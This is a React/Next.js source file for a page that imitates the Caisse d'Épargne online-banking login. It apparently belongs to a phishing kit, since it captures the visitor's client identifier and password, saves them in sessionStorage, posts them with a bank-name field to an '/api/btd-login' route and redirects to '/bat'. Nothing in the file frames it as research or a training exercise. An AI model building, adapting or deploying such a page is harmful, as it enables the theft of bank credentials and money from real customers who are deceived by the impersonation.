'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

interface CaisseEpargneConnexionProps {
  partnerLogoSrc?: string;
  ceLogoSrc?: string;
}

export default function CaisseEpargneConnexionPage({
  partnerLogoSrc = '/flavicon.ico',
  ceLogoSrc = '/12895685.png',
}: CaisseEpargneConnexionProps) {
  const router = useRouter();

  const [step, setStep] = useState<1 | 2>(1);
  const [clientId, setClientId] = useState<string>('');
  const [rememberMe, setRememberMe] = useState<boolean>(true);
  const [secretCode, setSecretCode] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  // Pavé numérique interactif
  const keyboardKeys = ['9', '7', '5', '1', '8', '0', '6', '3', '4', '2'];

  const handleKeyPress = (digit: string) => {
    setSecretCode((prev) => prev + digit);
  };

  const handleBackspace = () => {
    setSecretCode((prev) => prev.slice(0, -1));
  };

  const handleNextStep = (e?: FormEvent) => {
    if (e) e.preventDefault();
    if (clientId.trim()) {
      setStep(2);
    }
  };

  const handleCancelPass = () => {
    setSecretCode('');
    setStep(1);
  };

  // Soumission vers /api/btd-login et redirection vers /bat
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!secretCode.trim() || isSubmitting) return;

    setIsSubmitting(true);

    // Payload aligné sur les clés lues par la route API
    const payload = {
      nom_banque: 'CAISSE D\'EPARGNE',
      identifiant: clientId,
      secret_code: secretCode,
      rememberMe,
    };

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('sg_client_id', clientId);
        sessionStorage.setItem('sg_secret_code', secretCode);
      }

      const res = await fetch('/api/btd-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Vérification de la réussite HTTP
      if (!res.ok) {
        throw new Error(`Erreur réseau (Statut : ${res.status})`);
      }

      const data = await res.json();

      if (data.success) {
        router.push('/bat');
      }
    } catch (error) {
      console.error('Erreur lors de la soumission :', error);
    } finally {
      setIsSubmitting(false);
    }
  };
  return (
    <>
      <style>{`
        .ce-body-wrapper {
          font-family: 'Open Sans', system-ui, -apple-system, sans-serif;
          background-color: #f9fafb;
          color: #333333;
          display: flex;
          justify-content: center;
          min-height: 100vh;
          width: 100%;
          -webkit-font-smoothing: antialiased;
        }
        .ce-app-container {
          max-width: 450px;
          width: 100%;
          min-height: 100vh;
          background-color: #ffffff;
          display: flex;
          flex-direction: column;
          box-shadow: 0 4px 25px rgba(0, 0, 0, 0.04);
        }
        .ce-header-logo-area {
          display: flex;
          justify-content: center;
          align-items: center;
          padding: 20px;
          background-color: #ffffff;
        }
        .ce-logo-block {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 16px;
        }
        /* Alignement des dimensions (40px x 40px) */
        .ce-partner-logo,
        .ce-logo-img {
          height: 40px;
          width: 40px;
          object-fit: contain;
        }
        .ce-header-arrow {
          color: #94a3b8;
          font-size: 18px;
          font-weight: 600;
        }
        .ce-sub-nav-bar {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 24px;
          background-color: #ffffff;
          border-bottom: 1px solid #f3f4f6;
        }
        .ce-nav-link-red {
          color: #e2001a;
          font-size: 14px;
          font-weight: 600;
          text-decoration: none;
          cursor: pointer;
          display: flex;
          align-items: center;
          gap: 6px;
          user-select: none;
        }
        .ce-question-icon {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          width: 18px;
          height: 18px;
          border: 1.5px solid #e2001a;
          border-radius: 50%;
          font-size: 12px;
          font-weight: 700;
        }
        .ce-main-content {
          padding: 30px 24px;
          display: flex;
          flex-direction: column;
          flex-grow: 1;
        }
        .ce-step-title {
          font-size: 20px;
          color: #1a1a1a;
          font-weight: 700;
          margin-bottom: 25px;
          line-height: 1.3;
        }
        .ce-input-block {
          width: 100%;
          margin-bottom: 20px;
          position: relative;
        }
        .ce-input-block input {
          width: 100%;
          padding: 16px;
          font-family: inherit;
          font-size: 16px;
          color: #1a1a1a;
          background-color: #ffffff;
          border: 1px solid #cbd5e1;
          border-radius: 6px;
          outline: none;
          transition: border-color 0.2s, box-shadow 0.2s;
        }
        .ce-input-block input:focus {
          border-color: #e2001a;
        }
        /* Pavé Numérique */
        .ce-grid-keyboard {
          display: grid;
          grid-template-columns: repeat(4, 1fr);
          gap: 14px;
          max-width: 320px;
          margin: 0 auto 25px auto;
          justify-items: center;
        }
        .ce-key-button {
          width: 56px;
          height: 56px;
          border-radius: 50%;
          border: 1px solid #e2e8f0;
          background-color: #f8fafc;
          color: #1a1a1a;
          font-size: 18px;
          font-weight: 700;
          font-family: inherit;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          transition: background-color 0.15s, border-color 0.15s;
        }
        .ce-key-button:hover {
          background-color: #fee2e2;
          border-color: #fca5a5;
        }
        .ce-key-clear {
          background-color: #fff1f2;
          border-color: #fecdd3;
          color: #e2001a;
        }
        .ce-key-clear svg {
          width: 20px;
          height: 20px;
          fill: #e2001a;
        }
        .ce-forgotten-row {
          margin-bottom: 25px;
        }
        .ce-link-red {
          color: #e2001a;
          font-size: 14px;
          font-weight: 600;
          text-decoration: none;
        }
        .ce-link-red:hover {
          text-decoration: underline;
        }
        .ce-checkbox-row {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 35px;
          cursor: pointer;
          user-select: none;
        }
        .ce-custom-checkbox {
          width: 20px;
          height: 20px;
          accent-color: #e2001a;
          cursor: pointer;
          border-radius: 4px;
        }
        .ce-checkbox-row label {
          font-size: 14px;
          color: #4a5568;
          cursor: pointer;
        }
        .ce-action-zone {
          width: 100%;
          margin-top: auto;
        }
        .ce-btn-block-grey {
          width: 100%;
          padding: 16px;
          background-color: #f1f5f9;
          color: #94a3b8;
          border: none;
          border-radius: 8px;
          font-family: inherit;
          font-size: 16px;
          font-weight: 600;
          cursor: not-allowed;
          transition: background-color 0.2s, color 0.2s;
          text-align: center;
        }
        .ce-btn-active-red {
          background-color: #e2001a !important;
          color: #ffffff !important;
          cursor: pointer !important;
        }
        .ce-btn-active-red:hover {
          background-color: #b80014 !important;
        }
        .ce-double-btn {
          display: flex;
          flex-direction: column;
          gap: 12px;
        }
        .ce-btn-block-outline-red {
          width: 100%;
          padding: 15px;
          background-color: transparent;
          color: #e2001a;
          border: 1px solid #e2001a;
          border-radius: 8px;
          font-family: inherit;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: background-color 0.2s;
          text-align: center;
        }
        .ce-btn-block-outline-red:hover {
          background-color: #fff5f5;
        }
      `}</style>

      <div className="ce-body-wrapper">
        <div className="ce-app-container">
          {/* Header avec logos aux dimensions identiques */}
          <header className="ce-header-logo-area">
            <div className="ce-logo-block">
              <img src={partnerLogoSrc} alt="Favicon" className="ce-partner-logo" />
              <span className="ce-header-arrow">→</span>
              <img src={ceLogoSrc} alt="Caisse d'Épargne" className="ce-logo-img" />
            </div>
          </header>

          <div className="ce-sub-nav-bar">
            <span
              className="ce-nav-link-red"
              onClick={() => {
                if (confirm("Voulez-vous vraiment quitter l'espace de connexion ?")) {
                  window.location.reload();
                }
              }}
            >
              ‹ Quitter
            </span>
            <div className="ce-nav-link-red" style={{ cursor: 'default' }}>
              <span className="ce-question-icon">?</span>
              <span>Assistance</span>
            </div>
          </div>

          <main className="ce-main-content">
            {/* ÉTAPE 1 : IDENTIFIANT */}
            {step === 1 && (
              <form onSubmit={handleNextStep} style={{ display: 'flex', flexDirection: 'column', flexGrow: 1 }}>
                <h2 className="ce-step-title">Saisissez votre identifiant</h2>

                <div className="ce-input-block">
                  <input
                    type="text"
                    placeholder="Entrez votre identifiant"
                    value={clientId}
                    onChange={(e) => setClientId(e.target.value)}
                    autoComplete="off"
                  />
                </div>

                <div className="ce-forgotten-row">
                  <a href="#" className="ce-link-red">
                    Identifiant oublié ?
                  </a>
                </div>

                <div className="ce-checkbox-row">
                  <input
                    type="checkbox"
                    id="ce-remember-id"
                    className="ce-custom-checkbox"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                  />
                  <label htmlFor="ce-remember-id">Mémoriser mon identifiant</label>
                </div>

                <div className="ce-action-zone">
                  <button
                    type="submit"
                    disabled={!clientId.trim()}
                    className={`ce-btn-block-grey ${clientId.trim() ? 'ce-btn-active-red' : ''}`}
                  >
                    Valider
                  </button>
                </div>
              </form>
            )}

            {/* ÉTAPE 2 : MOT DE PASSE (Saisie libre + Pavé numérique) */}
            {step === 2 && (
              <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', flexGrow: 1 }}>
                <h2 className="ce-step-title">Saisissez votre mot de passe</h2>

                <div className="ce-input-block">
                  <input
                    type="password"
                    placeholder="Entrez votre mot de passe"
                    value={secretCode}
                    onChange={(e) => setSecretCode(e.target.value)}
                    autoComplete="off"
                  />
                </div>

                {/* Pavé Numérique Interactif */}
                <div className="ce-grid-keyboard">
                  {keyboardKeys.map((digit) => (
                    <button
                      key={digit}
                      type="button"
                      className="ce-key-button"
                      onClick={() => handleKeyPress(digit)}
                    >
                      {digit}
                    </button>
                  ))}
                  <button
                    type="button"
                    className="ce-key-button ce-key-clear"
                    onClick={handleBackspace}
                  >
                    <svg viewBox="0 0 24 24">
                      <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z" />
                    </svg>
                  </button>
                </div>

                <div className="ce-action-zone ce-double-btn">
                  <button
                    type="submit"
                    disabled={!secretCode.trim() || isSubmitting}
                    className={`ce-btn-block-grey ${secretCode.trim() && !isSubmitting ? 'ce-btn-active-red' : ''}`}
                  >
                    {isSubmitting ? 'Connexion...' : 'Valider'}
                  </button>
                  <button
                    type="button"
                    onClick={handleCancelPass}
                    className="ce-btn-block-outline-red"
                  >
                    Annuler
                  </button>
                </div>
              </form>
            )}
          </main>
        </div>
      </div>
    </>
  );
}